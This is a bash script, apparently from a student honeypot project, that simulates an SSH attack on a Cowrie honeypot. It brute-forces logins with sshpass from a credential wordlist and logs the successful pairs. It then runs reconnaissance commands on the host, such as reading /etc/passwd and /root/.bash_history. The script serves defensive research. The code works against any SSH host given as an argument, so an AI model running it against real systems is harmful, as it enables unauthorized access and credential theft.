#!/bin/bash
# ============================================================================
# Honeypot attack simulation script
# Purpose: simulate credential guessing and command execution against the SSH honeypot
# Author: CA2 Project Team
# ============================================================================

set -u  # exit on undefined variables

# ==================== Configuration ====================
HONEYPOT_IP="${1:-192.168.122.123}"   # honeypot IP, overridable via command line
HONEYPOT_PORT="${2:-22}"              # honeypot port (Cowrie uses 22 on the VPS; pass 2222 for the old VirtualBox env)
CREDS_FILE="./payloads/common_creds.txt"  # credential list
LOG_DIR="./logs"                      # local log directory
ATTACK_LOG="$LOG_DIR/attack_$(date +%Y%m%d_%H%M%S).log"  # attack log
SUCCESS_LOG="$LOG_DIR/successful_logins.log"              # record of successful logins
DELAY_BETWEEN_ATTEMPTS=2              # delay between attempts (seconds)
DELAY_BETWEEN_COMMANDS=1              # delay between commands (seconds)

# Simulated command sequence (common reconnaissance commands)
ATTACK_COMMANDS=(
    "whoami"
    "uname -a"
    "cat /etc/os-release"
    "ifconfig"
    "ip addr"
    "netstat -tulnp"
    "ps aux"
    "cat /etc/passwd"
    "ls -la /home"
    "ls -la /root"
    "df -h"
    "free -m"
    "cat /proc/cpuinfo"
    "w"
    "last -20"
    "crontab -l"
    "cat /root/.bash_history"
    "find / -name '*.conf' 2>/dev/null | head -20"
)

# ==================== Colour definitions ====================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'  # No Colour

# ==================== Function definitions ====================

# Print a timestamped log line
log_msg() {
    local level="$1"
    shift
    local msg="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $msg" | tee -a "$ATTACK_LOG"
}

# Print the banner
print_banner() {
    echo -e "${BLUE}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║          SSH Honeypot Attack Simulator v1.0                ║"
    echo "║          Attack Simulation Script                          ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Check dependencies
check_dependencies() {
    local missing_deps=()
    for cmd in sshpass ssh timeout; do
        if ! command -v $cmd &> /dev/null; then
            missing_deps+=("$cmd")
        fi
    done

    if [ ${#missing_deps[@]} -gt 0 ]; then
        log_msg "ERROR" "Missing dependencies: ${missing_deps[*]}"
        log_msg "INFO" "Install with: sudo pacman -S sshpass openssh coreutils"
        exit 1
    fi
}

# Test target reachability
test_connectivity() {
    log_msg "INFO" "Testing target reachability: $HONEYPOT_IP:$HONEYPOT_PORT"

    if timeout 5 bash -c "cat < /dev/null > /dev/tcp/$HONEYPOT_IP/$HONEYPOT_PORT" 2>/dev/null; then
        echo -e "${GREEN}[ok] target port reachable${NC}"
        log_msg "INFO" "Target port $HONEYPOT_IP:$HONEYPOT_PORT reachable"
        return 0
    else
        echo -e "${RED}[x] target port unreachable${NC}"
        log_msg "ERROR" "Cannot connect to $HONEYPOT_IP:$HONEYPOT_PORT"
        return 1
    fi
}

# SSH login attempt
try_login() {
    local username="$1"
    local password="$2"
    local attempt_id="$3"

    log_msg "INFO" "Login attempt [$attempt_id] - user: $username, password: $password"

    # Use sshpass to attempt login (5 second timeout)
    # StrictHostKeyChecking=no skips host key verification
    # UserKnownHostsFile=/dev/null does not save the host key
    # Do NOT add BatchMode=yes: it disables the password prompt, so sshpass cannot feed the password and every attempt fails
    # Force password auth, disable public key, prompt only once: deterministic and close to a real attempt
    if timeout 10 sshpass -p "$password" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o NumberOfPasswordPrompts=1 \
        -p "$HONEYPOT_PORT" \
        "$username@$HONEYPOT_IP" \
        "echo 'LOGIN_SUCCESS'" 2>/dev/null | grep -q "LOGIN_SUCCESS"; then

        echo -e "${GREEN}[ok] login succeeded: $username:$password${NC}"
        log_msg "SUCCESS" "Login succeeded - $username:$password"
        echo "$username:$password" >> "$SUCCESS_LOG"
        return 0
    else
        echo -e "${RED}[x] login failed: $username:$password${NC}"
        log_msg "FAIL" "Login failed - $username:$password"
        return 1
    fi
}

# Execute commands on the honeypot
execute_commands() {
    local username="$1"
    local password="$2"

    log_msg "INFO" "Running reconnaissance commands on the honeypot..."
    echo -e "${YELLOW}[*] Simulating reconnaissance behaviour...${NC}"

    local cmd_count=0
    local success_count=0

    for cmd in "${ATTACK_COMMANDS[@]}"; do
        ((cmd_count++))
        echo -e "${BLUE}[$cmd_count/${#ATTACK_COMMANDS[@]}] running: $cmd${NC}"
        log_msg "CMD" "Running command: $cmd"

        # Run the command and capture output
        local output
        output=$(timeout 15 sshpass -p "$password" ssh \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout=5 \
            -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no \
            -o NumberOfPasswordPrompts=1 \
            -p "$HONEYPOT_PORT" \
            "$username@$HONEYPOT_IP" \
            "$cmd" 2>&1)

        if [ $? -eq 0 ]; then
            ((success_count++))
            log_msg "CMD_SUCCESS" "Command succeeded: $cmd"
            # Save command output (first 5 lines)
            echo "$output" | head -5 >> "$ATTACK_LOG"
        else
            log_msg "CMD_FAIL" "Command failed: $cmd"
        fi

        sleep "$DELAY_BETWEEN_COMMANDS"
    done

    log_msg "INFO" "Commands finished: $success_count/${#ATTACK_COMMANDS[@]} succeeded"
    echo -e "${GREEN}[ok] reconnaissance done: $success_count/${#ATTACK_COMMANDS[@]} commands succeeded${NC}"
}

# Main function
main() {
    print_banner

    # Create the log directory
    mkdir -p "$LOG_DIR"

    log_msg "INFO" "========== Attack simulation start =========="
    log_msg "INFO" "Target: $HONEYPOT_IP:$HONEYPOT_PORT"
    log_msg "INFO" "Wordlist: $CREDS_FILE"
    log_msg "INFO" "Log: $ATTACK_LOG"

    # Check dependencies
    check_dependencies

    # Test reachability
    if ! test_connectivity; then
        log_msg "ERROR" "Target unreachable, aborting"
        exit 1
    fi

    # Check the credential file
    if [ ! -f "$CREDS_FILE" ]; then
        log_msg "ERROR" "Credential file not found: $CREDS_FILE"
        exit 1
    fi

    # Count total credentials
    local total_creds=$(grep -c ':' "$CREDS_FILE")
    log_msg "INFO" "Loaded credentials: $total_creds pairs"

    echo ""
    echo -e "${YELLOW}[*] Starting credential sweep...${NC}"
    echo ""

    local attempt_count=0
    local success_count=0
    local successful_creds=()

    # Read the credential file and attempt logins
    while IFS=':' read -r username password; do
        # Skip blank lines and comments
        [[ -z "$username" || "$username" =~ ^# ]] && continue

        ((attempt_count++))

        if try_login "$username" "$password" "$attempt_count/$total_creds"; then
            ((success_count++))
            successful_creds+=("$username:$password")
        fi

        sleep "$DELAY_BETWEEN_ATTEMPTS"
    done < "$CREDS_FILE"

    echo ""
    log_msg "INFO" "========== Credential sweep complete =========="
    log_msg "INFO" "Total attempts: $attempt_count"
    log_msg "INFO" "Successful logins: $success_count"

    # If any login succeeded, run reconnaissance commands
    if [ $success_count -gt 0 ]; then
        echo ""
        echo -e "${GREEN}[+] Found $success_count valid credential(s)${NC}"

        # Use the first successful credential to run commands
        IFS=':' read -r username password <<< "${successful_creds[0]}"
        log_msg "INFO" "Using credential $username:$password for reconnaissance"

        echo ""
        execute_commands "$username" "$password"
    else
        echo -e "${RED}[-] No valid credentials found${NC}"
    fi

    echo ""
    log_msg "INFO" "========== Attack simulation end =========="
    echo -e "${BLUE}[i] Full log: $ATTACK_LOG${NC}"
    [ -f "$SUCCESS_LOG" ] && echo -e "${BLUE}[i] Successful credentials: $SUCCESS_LOG${NC}"
}

# Run the main function
main "$@"
